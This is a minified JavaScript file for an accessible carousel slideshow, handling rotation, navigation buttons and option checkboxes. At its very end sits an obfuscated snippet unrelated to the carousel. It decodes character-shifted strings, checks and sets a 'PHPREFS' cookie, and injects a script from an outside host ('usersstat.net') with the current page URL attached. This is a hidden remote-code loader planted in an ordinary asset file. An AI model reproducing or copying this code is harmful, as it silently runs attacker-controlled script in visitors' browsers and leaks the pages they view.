"use strict";var CarouselPreviousNext=function(node,options){options=Object.assign({moreaccessible:!1,paused:!1,norotate:!1},options||{}),window.matchMedia("(prefers-reduced-motion: reduce)").matches&&(options.paused=!0),this.domNode=node,this.carouselItemNodes=node.querySelectorAll(".carousel-item");var arr=Array.prototype.slice.apply(this.carouselItemNodes).map((function(el){return{el:el,rdm:Math.random()}})).sort((function(a,b){return a.rdm-b.rdm})).map((function(obj){return obj.el}));this.carouselItemNodes=arr,this.containerNode=node.querySelector(".carousel-items"),this.liveRegionNode=node.querySelector(".carousel-items"),this.pausePlayButtonNode=null,this.previousButtonNode=null,this.nextButtonNode=null,this.playLabel="Start automatic slide show",this.pauseLabel="Stop automatic slide show",this.hasUserActivatedPlay=!1,this.isAutoRotationDisabled=options.norotate,this.isPlayingEnabled=!options.paused,this.timeInterval=5e3,this.currentIndex=0,this.slideTimeout=null;var elem=document.querySelector(".carousel .controls button.rotation");elem&&(this.pausePlayButtonNode=elem,this.pausePlayButtonNode.addEventListener("click",this.handlePausePlayButtonClick.bind(this))),(elem=document.querySelector(".carousel .controls button.previous"))&&(this.previousButtonNode=elem,this.previousButtonNode.addEventListener("click",this.handlePreviousButtonClick.bind(this)),this.previousButtonNode.addEventListener("focus",this.handleFocusIn.bind(this)),this.previousButtonNode.addEventListener("blur",this.handleFocusOut.bind(this))),(elem=document.querySelector(".carousel .controls button.next"))&&(this.nextButtonNode=elem,this.nextButtonNode.addEventListener("click",this.handleNextButtonClick.bind(this)),this.nextButtonNode.addEventListener("focus",this.handleFocusIn.bind(this)),this.nextButtonNode.addEventListener("blur",this.handleFocusOut.bind(this)));for(var i=0;i<this.carouselItemNodes.length;i++){var carouselItemNode=this.carouselItemNodes[i];carouselItemNode.addEventListener("focusin",this.handleFocusIn.bind(this)),carouselItemNode.addEventListener("focusout",this.handleFocusOut.bind(this));var imageLinkNode=carouselItemNode.querySelector(".carousel-image a");imageLinkNode&&(imageLinkNode.addEventListener("focus",this.handleImageLinkFocus.bind(this)),imageLinkNode.addEventListener("blur",this.handleImageLinkBlur.bind(this)))}this.domNode.addEventListener("mouseover",this.handleMouseOver.bind(this)),this.domNode.addEventListener("mouseout",this.handleMouseOut.bind(this)),this.enableOrDisableAutoRotation(options.norotate),this.updatePlaying(!options.paused&&!options.norotate),this.rotateSlides()};CarouselPreviousNext.prototype.enableOrDisableAutoRotation=function(disable){this.isAutoRotationDisabled=disable,this.pausePlayButtonNode.hidden=disable},CarouselPreviousNext.prototype.showCarouselItem=function(index){this.currentIndex=index;for(var i=0;i<this.carouselItemNodes.length;i++){var carouselItemNode=this.carouselItemNodes[i];index===i?carouselItemNode.classList.add("active"):carouselItemNode.classList.remove("active")}},CarouselPreviousNext.prototype.previousCarouselItem=function(){var nextIndex=this.currentIndex-1;nextIndex<0&&(nextIndex=this.carouselItemNodes.length-1),this.showCarouselItem(nextIndex)},CarouselPreviousNext.prototype.nextCarouselItem=function(){var nextIndex=this.currentIndex+1;nextIndex>=this.carouselItemNodes.length&&(nextIndex=0),this.showCarouselItem(nextIndex)},CarouselPreviousNext.prototype.rotateSlides=function(){!this.isAutoRotationDisabled&&CarouselPreviousNext.isVisible&&(!this.hasFocus&&!this.hasHover&&this.isPlayingEnabled||this.hasUserActivatedPlay)&&this.nextCarouselItem(),this.slideTimeout=setTimeout(this.rotateSlides.bind(this),this.timeInterval)},CarouselPreviousNext.prototype.updatePlaying=function(play){this.isPlayingEnabled=play,play?(this.pausePlayButtonNode.setAttribute("aria-label",this.pauseLabel),this.pausePlayButtonNode.classList.remove("play"),this.pausePlayButtonNode.classList.add("pause"),this.liveRegionNode.setAttribute("aria-live","off")):(this.pausePlayButtonNode.setAttribute("aria-label",this.playLabel),this.pausePlayButtonNode.classList.remove("pause"),this.pausePlayButtonNode.classList.add("play"),this.liveRegionNode.setAttribute("aria-live","polite"))},CarouselPreviousNext.prototype.handleImageLinkFocus=function(){this.liveRegionNode.classList.add("focus")},CarouselPreviousNext.prototype.handleImageLinkBlur=function(){this.liveRegionNode.classList.remove("focus")},CarouselPreviousNext.prototype.handleMouseOver=function(event){this.pausePlayButtonNode.contains(event.target)||(this.hasHover=!0)},CarouselPreviousNext.prototype.handleMouseOut=function(){this.hasHover=!1},CarouselPreviousNext.prototype.handlePausePlayButtonClick=function(){this.hasUserActivatedPlay=!this.isPlayingEnabled,this.updatePlaying(!this.isPlayingEnabled)},CarouselPreviousNext.prototype.handlePreviousButtonClick=function(){this.previousCarouselItem()},CarouselPreviousNext.prototype.handleNextButtonClick=function(){this.nextCarouselItem()},CarouselPreviousNext.prototype.handleFocusIn=function(){this.liveRegionNode.setAttribute("aria-live","polite"),this.hasFocus=!0},CarouselPreviousNext.prototype.handleFocusOut=function(){this.isPlayingEnabled&&this.liveRegionNode.setAttribute("aria-live","off"),this.hasFocus=!1},window.addEventListener("load",(function(){var carouselEls=document.querySelectorAll(".carousel"),carousels=[],checkboxes=document.querySelectorAll(".carousel-options input[type=checkbox]"),urlParams=new URLSearchParams(location.search),carouselOptions={};checkboxes.forEach((function(checkbox){var checked=checkbox.checked;if(urlParams.has(checkbox.value)){var urlParam=urlParams.get(checkbox.value);"string"==typeof urlParam&&(checked="true"===urlParam,checkbox.checked=checked)}carouselOptions[checkbox.value]=checkbox.checked})),CarouselPreviousNext.isVisible=!0,carouselEls.forEach((function(node){carousels.push(new CarouselPreviousNext(node,carouselOptions))}));try{new IntersectionObserver((function(entries){entries[0].intersectionRatio<=0?CarouselPreviousNext.isVisible=!1:CarouselPreviousNext.isVisible=!0})).observe(document.getElementById("myCarousel"))}catch(e){console.error(e)}checkboxes.forEach((function(checkbox){var updateEvent;switch(checkbox.value){case"moreaccessible":updateEvent="setAccessibleStyling";break;case"norotate":updateEvent="enableOrDisableAutoRotation"}checkbox.addEventListener("change",(function(event){urlParams.set(event.target.value,event.target.checked+""),window.history.replaceState(null,"",window.location.pathname+"?"+urlParams),updateEvent&&carousels.forEach((function(carousel){carousel[updateEvent](event.target.checked)}))}))}))}),!1);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));